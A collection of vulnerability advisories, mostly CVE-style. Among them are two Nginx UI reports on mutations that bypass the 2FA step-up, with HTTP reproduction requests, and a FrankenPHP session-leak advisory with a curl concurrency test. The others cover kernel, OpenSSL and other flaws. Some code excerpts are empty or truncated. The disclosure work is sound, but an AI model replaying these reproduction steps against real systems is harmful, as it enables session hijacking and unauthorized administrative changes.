items.summary:
Reporter: Jagadesh Achanta

Target: `0xJacky/nginx-ui`

Affected version / commit tested:
- App version: `2.3.10`
- Commit: `4948fba8744e82c3d7003f68ee164e9f49421066`
- Disclosure channel: GitHub Private Vulnerability Reporting
- Credential reference: `cred:github-jagstack-gh-cli`

## AI assistance disclosure

This report was prepared by Jagadesh Achanta with assistance from OpenAI/Codex for public source review, local evidence collection, and report drafting.

## Summary

Nginx UI has a short-lived OTP/passkey "secure session" step-up boundary for users with 2FA enabled. `RequireSecureSession()` rejects an OTP-enabled user's request unless the request includes a valid `X-Secure-Session-ID` issued after a fresh OTP/passkey verification.

The project already applies this step-up middleware to sensitive operations such as:

- Nginx config create/edit/rename/delete;
- site save/delete/enable/disable/rename/duplicate;
- stream save/delete/enable/disable/rename/duplicate;
- settings save and protected secret reads;
- backup restore.

However, several similarly sensitive authenticated mutation routes remain outside `RequireSecureSession()`. An attacker who obtains an authenticated JWT/session for a 2FA-enabled user, but does not have the victim's fresh OTP/passkey secure-session token, can still perform those operations.

The affected route groups include:

- automatic backup create/modify/delete/restore/test-S3 operations;
- DNS credential create/edit/delete operations;
- certificate and ACME user create/modify/delete/register operations;
- DNS domain, record, and DDNS create/update/delete operations;
- Nginx reload/restart, stub-status toggle, performance-setting update, and module-cache refresh operations;
- site/stream advanced-mode toggles and batch updates;
- auto-certificate binding/unbinding for sites;
- site navigation order and health-check updates.

This report is distinct from my earlier Nginx UI report about auto-backup path traversal. This report is about missing 2FA step-up authorization on sensitive authenticated mutation routes.

## Why this is a security boundary

`internal/middleware/secure_session.go` only requires a secure-session token for users with OTP enabled. For OTP users, it reads `X-Secure-Session-ID` from the header or query string and aborts with `401 Unauthorized` if the secure session is missing or invalid:

```go
if !cUser.EnabledOTP() {
    c.Next()
    return
}
ssid := c.GetHeader("X-Secure-Session-ID")
if ssid == "" {
    ssid = c.Query("X-Secure-Session-ID")
}
if ssid == "" {
    c.AbortWithStatusJSON(http.StatusUnauthorized, gin.H{
        "message": "Secure Session ID is empty",
    })
    return
}

if user.VerifySecureSessionID(ssid, cUser.ID) {
    c.Next()
    return
}
```

`internal/user/otp.go` issues the secure-session ID for only 10 minutes:

```go
func SetSecureSessionID(userId uint64) (sessionId string) {
    sessionId = uuid.NewString()
    cache.Set(secureSessionIDCacheKey(sessionId), userId, 10*time.Minute)
    return
}
```

The UI/server already rely on this boundary for sensitive actions. For example, `api/config/router.go` wraps config mutations with `RequireSecureSession()`:

```go
o := r.Group("", middleware.RequireSecureSession())
{
    o.POST("configs", AddConfig)
    o.POST("config", EditConfig)
    o.POST("config_mkdir", Mkdir)
    o.POST("config_rename", Rename)
    o.POST("config_delete", DeleteConfig)
}
```

`api/sites/router.go` protects normal site mutations:

```go
o := r.Group("", middleware.RequireSecureSession())
{
    o.POST("sites/:name/rename", RenameSite)
    o.POST("sites/:name/enable", EnableSite)
    o.POST("sites/:name/disable", DisableSite)
    o.POST("sites/:name", SaveSite)
    o.DELETE("sites/:name", DeleteSite)
    o.POST("sites/:name/duplicate", DuplicateSite)
    o.POST("sites/:name/maintenance", EnableMaintenanceSite)
}
```

`api/streams/router.go` protects normal stream mutations, and `api/settings/router.go` protects secret reads/settings saves:

```go
o := r.Group("", middleware.RequireSecureSession())
{
    o.POST("streams/:name", SaveStream)
    o.POST("streams/:name/rename", RenameStream)
    o.POST("streams/:name/enable", EnableStream)
    o.POST("streams/:name/disable", DisableStream)
    o.DELETE("streams/:name", DeleteStream)
    o.POST("streams/:name/duplicate", Duplicate)
}
```

```go
r.GET("settings/protected", middleware.RequireSecureSession(), GetProtectedSetting)
r.POST("settings", middleware.RequireSecureSession(), SaveSettings)
```

The repository's own tests also verify this expected behavior. `api/config/security_test.go`, `api/sites/security_test.go`, and `api/streams/security_test.go` each assert that OTP-enabled users receive `401 Unauthorized` when protected mutations are attempted without a secure session.

## Affected routes outside the step-up boundary

The affected routes are under the authenticated private router:

```go
g := root.Group("/", middleware.AuthRequired(), middleware.Proxy())
```

but they do not add `middleware.RequireSecureSession()`.

### Automatic backup management

`api/backup/router.go` protects manual restore:

```go
r.POST("/restore", middleware.AuthRequired(), middleware.RequireSecureSession(), middleware.EncryptedForm(), RestoreBackup)
```

but the automatic backup management router has no secure-session middleware:

```go
r.POST("/auto_backup", CreateAutoBackup)
r.POST("/auto_backup/:id", ModifyAutoBackup)
r.DELETE("/auto_backup/:id", DestroyAutoBackup)
r.PATCH("/auto_backup/:id", RestoreAutoBackup)
r.POST("/auto_backup/test_s3", TestS3Connection)
```

Those handlers create or modify backup jobs, register cron jobs, test attacker-supplied S3 settings, and store S3 credentials:

```go
"s3_access_key_id":     "omitempty",
"s3_secret_access_key": "omitempty",
...
if ctx.Model.Enabled {
    if err := cron.AddAutoBackupJob(ctx.Model.ID, ctx.Model.CronExpression); err != nil {
```

The model stores S3 secret material:

```go
S3AccessKeyID     string `json:"s3_access_key_id" gorm:"comment:S3 access key ID;serializer:json[aes]"`
S3SecretAccessKey string `json:"s3_secret_access_key" gorm:"comment:S3 secret access key;serializer:json[aes]"`
```

### Certificate, ACME, and DNS credential management

`api/certificate/router.go` registers credential and certificate mutations without `RequireSecureSession()`:

```go
r.POST("dns_credentials", AddDnsCredential)
r.POST("dns_credentials/:id", EditDnsCredential)
r.DELETE("dns_credentials/:id", DeleteDnsCredential)

r.POST("certs", AddCert)
r.POST("certs/:id", ModifyCert)
r.DELETE("certs/:id", RemoveCert)
r.PUT("cert_sync", SyncCertificate)

r.POST("acme_users", CreateAcmeUser)
r.POST("acme_users/:id", ModifyAcmeUser)
r.POST("acme_users/:id/register", RegisterAcmeUser)
r.DELETE("acme_users/:id", DestroyAcmeUser)
```

The DNS credential handlers persist provider configuration:

```go
dnsCredential := model.DnsCredential{
    Name:         json.Name,
    Config:       &json.Config,
    Provider:     json.Provider,
    ProviderCode: providerCode,
}
...
err := d.Create(&dnsCredential)
```

The model serializes that configuration with AES:

```go
Config *dns.Config `json:"config,omitempty" gorm:"serializer:json[aes]"`
```

### DNS domains, records, and DDNS

`api/dns/router.go` registers DNS domain, record, and DDNS mutations without secure-session middleware:

```go
group.POST("/domains", CreateDomain)
group.POST("/domains/:id", UpdateDomain)
group.DELETE("/domains/:id", DeleteDomain)
group.POST("/domains/:id/records", CreateRecord)
group.PUT("/domains/:id/records/:record_id", UpdateRecord)
group.DELETE("/domains/:id/records/:record_id", DeleteRecord)
group.PUT("/domains/:id/ddns", UpdateDDNSConfig)
group.DELETE("/domains/:id/ddns", DeleteDDNSConfig)
```

...
record, err := svc.UpdateRecord(c.Request.Context(), domainID, recordID, toRecordInput(payload))

### Nginx control and configuration-side effects

`api/nginx/router.go` registers several server/Nginx mutation endpoints without `RequireSecureSession()`:

```go
r.POST("nginx/reload", Reload)
r.POST("nginx/restart", Restart)
r.POST("nginx/stub_status", ToggleStubStatus)
r.POST("nginx/performance", UpdatePerformanceSettings)
r.POST("nginx/modules/refresh", RefreshModulesCache)
```

The handlers perform control actions or persist Nginx-related changes:

```go
func Reload(c *gin.Context) {
    nginx.Control(nginx.Reload).Resp(c)
}

func Restart(c *gin.Context) {
    c.JSON(http.StatusOK, gin.H{
        "message": "ok",
    })
    go nginx.Restart()
}
```

```go
if json.Enable {
    err = performance.EnableStubStatus()
} else {
    err = performance.DisableStubStatus()
}
...
reloadOutput, err := nginx.Reload()
```

```go
err := performance.UpdatePerfOpt(&perfOpt)
```

### Site and stream advanced/batch mutations

`api/sites/router.go` leaves these site mutations before the secure-session group:

```go
r.PUT("sites", BatchUpdateSites)
r.POST("sites/:name/advance", DomainEditByAdvancedMode)
r.POST("auto_cert/:name", AddDomainToAutoCert)
r.DELETE("auto_cert/:name", RemoveDomainFromAutoCert)
r.POST("site_navigation/order", UpdateSiteOrder)
r.POST("site_navigation/health_check/:id", UpdateHealthCheck)
```

`DomainEditByAdvancedMode()` persists the site's `Advanced` mode:

```go

```

`AddDomainToAutoCert()` writes certificate automation settings including DNS credential ID, domains, challenge method, and ACME user:

```go

    Name:            name,
    Domains:         json.Domains,
    AutoCert:        model.AutoCertEnabled,
    DnsCredentialID: json.DnsCredentialID,

    ACMEUserID:      json.ACMEUserID,
})
```

`api/streams/router.go` protects normal stream save/delete operations, but leaves batch update and advanced-mode outside:

```go
r.PUT("streams", BatchUpdateStreams)
...
r.POST("streams/:name/advance", AdvancedEdit)
```

`AdvancedEdit()` persists the stream's `Advanced` mode:

```go

```

## Safe local proof

I did not access any external Nginx UI deployment. The following proof only inspects the checked-out source tree and confirms that:

- `RequireSecureSession()` is a real OTP-gated 10-minute step-up mechanism;
- high-risk control routes are intentionally protected elsewhere;
- the affected route groups are authenticated but outside `RequireSecureSession()`;
- the affected handlers perform persistent or server-control side effects.

Run:

```bash
python3 reports/nginx-ui-missing-secure-session-step-up-poc.py
```

Observed output:

```json
{
  "all_affected_groups_present": true,
  "all_controls_present": true,
  "all_side_effects_present": true,
  "commit": "4948fba8744e82c3d7003f68ee164e9f49421066",
  "result": "VULNERABLE_SOURCE_CONFIRMED",
  "target": "0xJacky/nginx-ui"
}
```

The full local proof output is available in my workspace as `tmp/nginx-ui-missing-secure-session-step-up-poc-output.txt`.

## HTTP reproduction outline

This is a local-only reproduction outline for an isolated Nginx UI test instance, consistent with the project's security policy:

1. Create a test user with OTP enabled.
2. Log in as that user and keep only the normal authenticated session/JWT.
3. Do not obtain or send a fresh `X-Secure-Session-ID`.
4. Verify the expected protected control behavior:

```http
POST /api/config
Authorization: <otp-user-session>
Content-Type: application/json

{ "name": "example.conf", "content": "server { listen 80; }" }
```

Expected result: `401 Unauthorized` because config edits require `RequireSecureSession()`.

5. Attempt an affected operation with the same OTP-enabled session and no `X-Secure-Session-ID`, for example:

```http
POST /api/dns_credentials
Authorization: <otp-user-session>
Content-Type: application/json

{
  "name": "attacker-controlled-test",
  "provider": "cloudflare",
  "provider_code": "cloudflare",
  "token": "test-token"
}
```

Expected secure behavior: `401 Unauthorized`, matching the secure-session requirement for other sensitive configuration changes.

Actual behavior from source review: the request reaches `AddDnsCredential()` because the DNS credential router is under `AuthRequired()` but does not apply `RequireSecureSession()`.

The same missing step-up applies to the other route groups listed above.

## Impact

If an attacker obtains the authenticated web session/JWT for a 2FA-enabled Nginx UI user, the secure-session boundary should limit what they can do until they also pass a fresh OTP/passkey challenge. The current route map leaves major administrative actions outside that boundary.

Depending on the victim user's privileges and deployment configuration, this can allow the attacker to:

- add, edit, or remove DNS provider credentials;
- alter certificate and ACME automation;
- create, modify, delete, or restore automatic backup jobs;
- configure S3 backup destinations and trigger S3 connection tests;
- alter DNS domains, records, or DDNS schedules through configured providers;
- restart or reload Nginx;
- enable/disable stub-status and change performance settings;
- switch sites/streams into advanced mode or change site automation bindings.

This undermines the value of the secure-session step-up for OTP-enabled accounts. I am not claiming pre-authentication access or remote code execution from this issue. The issue is missing step-up authorization for sensitive authenticated mutations.

## Suggested fix

Recommended mitigation:

1. Apply `middleware.RequireSecureSession()` to all high-impact authenticated mutation routes that alter server, Nginx, certificate, DNS, backup, credential, or automation state.
2. At minimum, protect:
   - auto-backup create/modify/delete/restore/test-S3;
   - DNS credential create/edit/delete;
   - certificate and ACME user mutations;
   - DNS domain, record, and DDNS mutations;
   - Nginx reload/restart/stub-status/performance/module-cache mutation routes;
   - site/stream advanced-mode, batch, auto-cert, navigation order, and health-check mutations.
3. Add regression tests mirroring the existing config/site/stream security tests:
   - OTP-enabled user without `X-Secure-Session-ID` receives `401`;
   - OTP-enabled user with a valid secure-session ID succeeds;
   - non-OTP users retain existing behavior if that is the intended product policy.
4. Consider centralizing "sensitive mutation" routing to make future omissions harder.

items.summary:
## Summary
In worker mode under concurrency, FrankenPHP can hand a PHP session id from one request to another when PHP's `session` extension is loaded as a shared module instead of being statically linked into the FrankenPHP binary. A request presenting `Cookie: session=A` can have `session_id()` resolve to `B` (a different concurrent client's id) or to a stale id from a previous request served by the same worker thread.

## Impact
- **Security:** cross-user session exposure / session hijacking in worker mode. Same impact class as CVE-2026-24894.
- **Functional:** users are intermittently logged out; their cookie's session is ignored and they receive a foreign or empty session.

## Affected / not affected
Exposure is determined by how the `session` extension is linked in the PHP build FrankenPHP is compiled against, **not** by the FrankenPHP release:

- **Affected:** any build where the `session` extension is not visible to FrankenPHP at compile time, i.e. loaded as a shared / out-of-tree module (`extension=session` in an ini). This includes the RPM and Debian packages and other packaged `php-zts` distributions that ship `session` as a shared extension under `conf.d`.
- **Not affected:** builds where `session` is statically compiled into the PHP that FrankenPHP links against, such as the official static binaries and Docker images. There, the reset code below is compiled in and clears the id every request.

The C session-reset code is unchanged across 1.11.x-1.12.x, so this is not a code regression between releases. A "1.12.2 works / 1.12.3 leaks" observation on the same host reflects two differently-built packages, not a source change. The persistent-zval helpers (#2366) are compiled only under `FRANKENPHP_TEST` and are unrelated.

## Root cause
FrankenPHP resets per-request session state in `frankenphp_reset_session_state()`, which releases `PS(id)` so the next `session_start()` re-reads the request cookie. That whole function is guarded by `#ifdef HAVE_PHP_SESSION`, a macro defined only when the session extension headers are present at FrankenPHP compile time (session statically enabled in the PHP build). When `session` is a shared module, `HAVE_PHP_SESSION` is undefined, the reset is compiled out, and `PS(id)` survives the request boundary.

PHP's `session_start()` reads the request cookie only when `PS(id)` is `NULL` (`ext/session/session.c`, `try_find_session_id_in_cookies()`: `if (!PS(use_cookies) || PS(id)) return;`). With a stale `PS(id)`, the cookie is ignored and the worker reuses the previous request's id, exposing it to whichever client is served next.

## Reproduction
Minimal worker script (`index.php`):
```php
<?php
$handler = static function () {
    session_start();
    $sent = $_COOKIE['session'] ?? '(none)';
    $id   = session_id();
    header('Content-Type: text/plain');
    echo ($sent === '(none)' || $sent === $id) ? "OK   sent=$sent id=$id\n"
                                               : "LEAK sent=$sent id=$id\n";
    session_write_close();
};
while (\frankenphp_handle_request($handler)) {}
```
Run under worker mode with `num 2` (≥2 workers), `session.use_strict_mode=1`, on a PHP build where `session` is a shared module. Pre-create two valid sessions `A` and `B`, then fire concurrent requests alternating the two cookies:
```sh
seq 600 | xargs -P32 -I{} sh -c '
  c=$([ $(( {} % 2 )) -eq 0 ] && echo A || echo B);
  curl -s -H "Cookie: session=$c" http://127.0.0.1:8080/' | grep -c LEAK
```
On an affected build a large fraction of responses are `LEAK` (`session_id()` differs from the cookie sent, and `A` and `B` sometimes resolve to the same id). On a statically-linked build the count is always `0`.

## Fix
When `HAVE_PHP_SESSION` is undefined, FrankenPHP now resets the `session` module through the module registry on every worker request (its `RSHUTDOWN` releases `PS(id)`, `RINIT` re-initialises the globals), so the per-request cleanup always runs regardless of how the extension is linked. Statically-linked builds are unchanged and keep using `frankenphp_reset_session_state()`.

Verified on PHP 8.6-dev ZTS, 2 workers, `session.use_strict_mode=1`, 600 alternating-cookie concurrent requests: before the fix 519/600 leaked; after the fix 0/600. Statically-linked builds stayed at 0/600.

## Workarounds
- Use a FrankenPHP build with `session` statically compiled (official static binaries or Docker images).
- Or, in the worker loop, after `session_write_close()` call `session_id('')` so the next `session_start()` re-reads the request cookie (with `session.use_strict_mode=1`).

Zephyr's IP socket recvmsg() implementation (subsys/net/lib/sockets/sockets_inet.c, insert_pktinfo()) validated the user-supplied ancillary (msg_control) buffer using only the payload length (msg->msg_controllen < pktinfo_len) before writing a full control message consisting of an aligned cmsg header plus the payload. Because the check omitted the cmsg header size, a control buffer whose length falls in the under-checked window (e.g. 16-27 bytes for IPv4 IP_PKTINFO on a 64-bit target, where a single element actually occupies 28 bytes) passes the guard yet causes a fixed-size out-of-bounds write of up to one cmsg header (~12 bytes) past the end of the buffer.

Under CONFIG_USERSPACE the recvmsg verifier allocates a kernel-heap copy of the control buffer sized to msg_controllen and runs the implementation against it, so the overflow corrupts kernel heap memory and is triggerable from an unprivileged userspace thread; in supervisor mode it corrupts the caller's buffer.

The path is reachable on a UDP/IP socket with IP_PKTINFO/IPV6_RECVPKTINFO (or hoplimit/timestamping) enabled when the application calls recvmsg() with an undersized control buffer and a datagram is received; part of the overwritten bytes (the destination IP in ipi_addr) is influenced by the received packet.

The fix makes the capacity check use NET_CMSG_SPACE(pktinfo_len) (aligned header + aligned data) and returns -ENOMEM when the buffer is too small. Affected: v3.6.0 through v4.4.0.

items.summary:
In the Linux kernel, the following vulnerability has been resolved:

perf/x86/intel: KVM: Mask PEBS_ENABLE loaded for guest with vCPU's value.

When generating the MSR_IA32_PEBS_ENABLE value that will be loaded on
VM-Entry to a KVM guest, mask the value with the vCPU's desired PEBS_ENABLE
value.  Consulting only the host kernel's host vs. guest masks results in
running the guest with PEBS enabled even when the guest doesn't want to use
PEBS.  Because KVM uses perf events to proxy the guest virtual PMU, simply
looking at exclude_host can't differentiate between events created by host
userspace, and events created by KVM on behalf of the guest.

Running the guest with PEBS unexpectedly enabled typically manifests as
crashes due to a near-infinite stream of #PFs.  E.g. if the guest hasn't
written MSR_IA32_DS_AREA, the CPU will hit page faults on address '0' when
trying to record PEBS events.

The issue is most easily reproduced by running `perf kvm top` from before
commit 7b100989b4f6 ("perf evlist: Remove __evlist__add_default") (after
which, `perf kvm top` effectively stopped using PEBS).	The userspace side
of perf creates a guest-only PEBS event, which intel_guest_get_msrs()
misconstrues a guest-*owned* PEBS event.

Arguably, this is a userspace bug, as enabling PEBS on guest-only events
simply cannot work, and userspace can kill VMs in many other ways (there
is no danger to the host).  However, even if this is considered to be bad
userspace behavior, there's zero downside to perf/KVM restricting PEBS to
guest-owned events.

Note, commit 854250329c02 ("KVM: x86/pmu: Disable guest PEBS temporarily
in two rare situations") fixed the case where host userspace is profiling
KVM *and* userspace, but missed the case where userspace is profiling only
KVM.

items.summary:
A privilege escalation vulnerability exists in Google Cloud's Dialogflow CX.

Dialogflow agent developers with Webhook editor permission are able to configure Webhooks using Dialogflow service agent access token authentication. 
This allows the attacker to escalate their privileges from agent-level to project-level, granting them unauthorized access to manage resources in services associated with the project, leading to unexpected costs and resource depletion for the producer project.

A fix was applied on the server side to protect from this vulnerability in February 2025. No customer action is required.

items.summary: An issue was discovered in Canonical Multipass for macOS before version 1.16.3 due to an incomplete fix for CVE-2025-5199. While the patch in version 1.16.0 updated the ownership of the multipassd daemon binary to root:wheel, five co-located binaries (multipass, qemu-img, qemu-system-aarch64, qemu-system-x86_64, and sshfs_server) in /Library/Application Support/com.canonical.multipass/bin/ retain ownership by the installing user and remain writable. Because the root LaunchDaemon (com.canonical.multipassd.plist) configures a PATH environment variable that prioritizes this user-writable directory and invokes these auxiliary binaries by their bare names, a local attacker can replace an auxiliary binary (such as qemu-img) with a malicious wrapper. When the root daemon subsequently triggers the binary during routine execution (e.g., via multipass launch), the malicious code executes with root privileges, leading to local privilege escalation.

items.summary: OmniFaces is a utility library for Faces. In OmniFaces versions before 1.14.3, 2.7.33, 3.14.23, 4.7.12, and 5.4.2, CombinedResourceHandler accepts a structurally valid deflated and base64 encoded combined resource ID without verifying that the server issued it. A forged ID can cause unbounded decoded output, add unique reconstructed IDs to a process-lifetime cache, or combine resources other than stylesheets and scripts. Because jakarta.faces.RESOURCE_EXCLUDES is not applied by this custom resolution path, a forged ID can disclose Facelets source from the webapp resource tree or META-INF/resources. In a deployment configured with the wildcard CDN mapping, a forged ID that selects omnifaces.graphic can also cause a blind, deployment-dependent server-side fetch whose destination derives partly from the request Host header. The flaw does not provide arbitrary file read or establish arbitrary-scheme or arbitrary-destination SSRF. The shared authenticity failure permits memory exhaustion and limited resource disclosure. This issue is fixed in versions 1.14.3, 2.7.33, 3.14.23, 4.7.12, and 5.4.2.

Prior to 2.13.2, an authenticated administrator using the default H2 database and security mode can upload a crafted SQL file to POST /api/v1/database/import-database. DatabaseService.validateSqlContent() splits normalized input on semicolons and accepts a statement when it contains any allowed keyword, allowing dangerous H2 functions such as FILE_READ and CSVWRITE, plus CREATE ALIAS, to bypass the insufficient whitelist and execute side effects when RUNSCRIPT processes the file. This permits arbitrary file access. The demonstrated operating-system command execution chain writes attacker-controlled startup files to a user-site location and then triggers an application Python interpreter configured to load those startup files, resulting in command execution as the JVM service account. This issue is fixed in version 2.13.2.

items.summary:
Issue summary: Calling the OpenSSL API function SSL_select_next_proto with an
empty supported client protocols buffer may cause a crash or memory contents to
be sent to the peer.

Impact summary: A buffer overread can have a range of potential consequences
such as unexpected application beahviour or a crash. In particular this issue
could result in up to 255 bytes of arbitrary private data from memory being sent
to the peer leading to a loss of confidentiality. However, only applications
that directly call the SSL_select_next_proto function with a 0 length list of
supported client protocols are affected by this issue. This would normally never
be a valid scenario and is typically not under attacker control but may occur by
accident in the case of a configuration or programming error in the calling
application.

The OpenSSL API function SSL_select_next_proto is typically used by TLS
applications that support ALPN (Application Layer Protocol Negotiation) or NPN
(Next Protocol Negotiation). NPN is older, was never standardised and
is deprecated in favour of ALPN. We believe that ALPN is significantly more
widely deployed than NPN. The SSL_select_next_proto function accepts a list of
protocols from the server and a list of protocols from the client and returns
the first protocol that appears in the server list that also appears in the
client list. In the case of no overlap between the two lists it returns the
first item in the client list. In either case it will signal whether an overlap
between the two lists was found. In the case where SSL_select_next_proto is
called with a zero length client list it fails to notice this condition and
returns the memory immediately following the client list pointer (and reports
that there was no overlap in the lists).

This function is typically called from a server side application callback for
ALPN or a client side application callback for NPN. In the case of ALPN the list
of protocols supplied by the client is guaranteed by libssl to never be zero in
length. The list of server protocols comes from the application and should never
normally be expected to be of zero length. In this case if the
SSL_select_next_proto function has been called as expected (with the list
supplied by the client passed in the client/client_len parameters), then the
application will not be vulnerable to this issue. If the application has
accidentally been configured with a zero length server list, and has
accidentally passed that zero length server list in the client/client_len
parameters, and has additionally failed to correctly handle a "no overlap"
response (which would normally result in a handshake failure in ALPN) then it
will be vulnerable to this problem.

In the case of NPN, the protocol permits the client to opportunistically select
a protocol when there is no overlap. OpenSSL returns the first client protocol
in the no overlap case in support of this. The list of client protocols comes
from the application and should never normally be expected to be of zero length.
However if the SSL_select_next_proto function is accidentally called with a
client_len of 0 then an invalid memory pointer will be returned instead. If the
application uses this output as the opportunistic protocol then the loss of
confidentiality will occur.

This issue has been assessed as Low severity because applications are most
likely to be vulnerable if they are using NPN instead of ALPN - but NPN is not
widely used. It also requires an application configuration or programming error.
Finally, this issue would not typically be under attacker control making active
exploitation unlikely.

The FIPS modules in 3.3, 3.2, 3.1 and 3.0 are not affected by this issue.

Due to the low severity of this issue we are not issuing new releases of
OpenSSL at this time. The fix will be included in the next releases when they
become available.

In the Linux kernel, the following vulnerability has been resolved:

ksmbd: require 3 sub-authorities before reading sub_auth[2]

parse_dacl() compares each ACE SID against sid_unix_NFS_mode and on
match reads sid.sub_auth[2] as the file mode.  If sid_unix_NFS_mode is
the prefix S-1-5-88-3 with num_subauth = 2 then compare_sids() compares
only min(num_subauth, 2) sub-authorities so a client SID with
num_subauth = 2 and sub_auth = {88, 3} will match.

If num_subauth = 2 and the ACE is placed at the very end of the security
descriptor, sub_auth[2] will be  4 bytes past end_of_acl.  The
out-of-band bytes will then be masked to the low 9 bits and applied as
the file's POSIX mode, probably not something that is good to have
happen.

Fix this up by forcing the SID to actually carry a third sub-authority
before reading it at all.

items.summary:
In the Linux kernel, the following vulnerability has been resolved:

netfilter: nf_conntrack_sip: fix Content-Length u32 truncation in sip_help_tcp()

sip_help_tcp() parses the SIP Content-Length header with
simple_strtoul(), which returns unsigned long, but stores the result in
unsigned int clen.  On 64-bit systems, values exceeding UINT_MAX are
silently truncated before computing the SIP message boundary.

For example, Content-Length 4294967328 (2^32 + 32) is truncated to 32,
causing the parser to miscalculate where the current message ends.  The
loop then treats trailing data in the TCP segment as a second SIP
message and processes it through the SDP parser.

Fix this by changing clen to unsigned long to match the return type of
simple_strtoul(), and reject Content-Length values that exceed the
remaining TCP payload length.

In the Linux kernel, the following vulnerability has been resolved:

bpf, ktls: Fix data corruption when using bpf_msg_pop_data() in ktls

When sending plaintext data, we initially calculated the corresponding
ciphertext length. However, if we later reduced the plaintext data length
via socket policy, we failed to recalculate the ciphertext length.

This results in transmitting buffers containing uninitialized data during
ciphertext transmission.

This causes uninitialized bytes to be appended after a complete
"Application Data" packet, leading to errors on the receiving end when
parsing TLS record.

items.summary:
### Summary
An OTP-enabled authenticated user who cannot use the HTTP configuration mutation endpoints without a valid secure session can still mutate Nginx configuration through `/mcp` and `/mcp_message` using only ordinary authentication.

### Details
The HTTP configuration mutation surface is explicitly grouped behind `middleware.RequireSecureSession()`. By contrast, the MCP endpoints are exposed with only `middleware.AuthRequired()`. The MCP server exposes configuration mutation tools including `nginx_config_add` and `nginx_config_modify`, so OTP-enabled users gain an alternate path around the intended step-up requirement.

Relevant code paths:
- [api/config/router.go](/home/kali/Desktop/bounty/nginx-ui/api/config/router.go:14)
- [internal/middleware/secure_session.go](/home/kali/Desktop/bounty/nginx-ui/internal/middleware/secure_session.go:52)
- [mcp/router.go](/home/kali/Desktop/bounty/nginx-ui/mcp/router.go:9)
- [mcp/config/config_add.go](/home/kali/Desktop/bounty/nginx-ui/mcp/config/config_add.go:34)
- [mcp/config/config_modify.go](/home/kali/Desktop/bounty/nginx-ui/mcp/config/config_modify.go:55)

This is a security-control bypass rather than a missing feature. The product already established that OTP-enabled users should complete a secure session before high-impact configuration mutations are accepted on the HTTP path.

### PoC
I verified this locally in an isolated environment with a temporary end-to-end harness that exercised the real `/mcp` and `/mcp_message` routes.

What the executed test did:
1. Created a temporary config directory and configured Nginx control commands to harmless local values (`true`) to avoid touching the host.
2. Created a real OTP-enabled user in a temporary SQLite database.
3. Generated a real JWT for that OTP-enabled user.
4. Started a local test server exposing the real `/mcp` and `/mcp_message` routes.
5. Opened an authenticated SSE connection to `/mcp` with the JWT and no `X-Secure-Session-ID`.
6. Initialized the MCP session over `/mcp_message`.
7. Called the real `nginx_config_add` tool over `/mcp_message`.
8. Verified that the tool succeeded and created `mcp-bypass.conf` in the managed config directory without any secure-session step-up.

Observed result from the actual local verification:
- The MCP session initialized successfully without any `X-Secure-Session-ID`.
- The config file was written through the MCP tool path using only JWT authentication.

### Impact
OTP-enabled accounts lose the intended step-up protection for high-impact Nginx configuration changes when MCP is enabled. A user who should be blocked until re-authenticating can still create or modify configuration files and trigger reload behavior through MCP.

items.summary:
There is a type confusion vulnerability relating to X.400 address processing
inside an X.509 GeneralName. X.400 addresses were parsed as an ASN1_STRING but
the public structure definition for GENERAL_NAME incorrectly specified the type
of the x400Address field as ASN1_TYPE. This field is subsequently interpreted by
the OpenSSL function GENERAL_NAME_cmp as an ASN1_TYPE rather than an
ASN1_STRING.

When CRL checking is enabled (i.e. the application sets the
X509_V_FLAG_CRL_CHECK flag), this vulnerability may allow an attacker to pass
arbitrary pointers to a memcmp call, enabling them to read memory contents or
enact a denial of service. In most cases, the attack requires the attacker to
provide both the certificate chain and CRL, neither of which need to have a
valid signature. If the attacker only controls one of these inputs, the other
input must already contain an X.400 address as a CRL distribution point, which
is uncommon. As such, this vulnerability is most likely to only affect
applications which have implemented their own functionality for retrieving CRLs

items.summary: The BN_mod_sqrt() function, which computes a modular square root, contains a bug that can cause it to loop forever for non-prime moduli. Internally this function is used when parsing certificates that contain elliptic curve public keys in compressed form or explicit elliptic curve parameters with a base point encoded in compressed form. It is possible to trigger the infinite loop by crafting a certificate that has invalid explicit curve parameters. Since certificate parsing happens prior to verification of the certificate signature, any process that parses an externally supplied certificate may thus be subject to a denial of service attack. The infinite loop can also be reached when parsing crafted private keys as they can contain explicit elliptic curve parameters. Thus vulnerable situations include: - TLS clients consuming server certificates - TLS servers consuming client certificates - Hosting providers taking certificates or private keys from customers - Certificate authorities parsing certification requests from subscribers - Anything else which parses ASN.1 elliptic curve parameters Also any other applications that use the BN_mod_sqrt() where the attacker can control the parameter values are vulnerable to this DoS issue. In the OpenSSL 1.0.2 version the public key is not parsed during initial parsing of the certificate which makes it slightly harder to trigger the infinite loop. However any operation which requires the public key from the certificate will trigger the infinite loop. In particular the attacker can use a self-signed certificate to trigger the loop during verification of the certificate signature. This issue affects OpenSSL versions 1.0.2, 1.1.1 and 3.0. It was addressed in the releases of 1.1.1n and 3.0.2 on the 15th March 2022. Fixed in OpenSSL 3.0.2 (Affected 3.0.0,3.0.1). Fixed in OpenSSL 1.1.1n (Affected 1.1.1-1.1.1m). Fixed in OpenSSL 1.0.2zd (Affected 1.0.2-1.0.2zc).

In the Linux kernel, the following vulnerability has been resolved:

btrfs: lzo: reject compressed segment that overflows the compressed input

lzo_decompress_bio() validates each on-disk segment length seg_len only
against the workspace cbuf size, not against the compressed input size
(compressed_len, the total folio bytes of the bio).  A crafted extent can
carry a segment whose seg_len passes the cbuf check but runs past the end
of the bio, so copy_compressed_segment() walks off the last folio:
get_current_folio() then returns the NULL folio from bio_next_folio(), and
with CONFIG_BTRFS_ASSERT disabled (default) folio_size(NULL) faults.

 BUG: KASAN: null-ptr-deref in lzo_decompress_bio (fs/btrfs/lzo.c:383)
 Read of size 8 at addr 0000000000000000 by task kworker/u8:1/29
 Workqueue: btrfs-endio simple_end_io_work
  kasan_report (mm/kasan/report.c:590)
  lzo_decompress_bio (fs/btrfs/lzo.c:383)
  end_bbio_compressed_read (fs/btrfs/compression.c:1065)
  btrfs_bio_end_io (fs/btrfs/bio.c:135)
  btrfs_check_read_bio (fs/btrfs/bio.c:180 fs/btrfs/bio.c:285)
  simple_end_io_work
  process_one_work
  worker_thread

Reject any segment whose payload would extend beyond compressed_len before
copying it, treating it as corruption like the other on-disk validation
failures in this function.

In the Linux kernel, the following vulnerability has been resolved:

tcp: fix TFO max_qlen accounting across reuseport migration

A listener's TCP_FASTOPEN max_qlen stops being accurate and lets through
far more pending Fast Open requests than it was configured for.

This only shows up with SO_REUSEPORT listener migration, where closing a
listener hands its still-pending TFO children over to a surviving one.

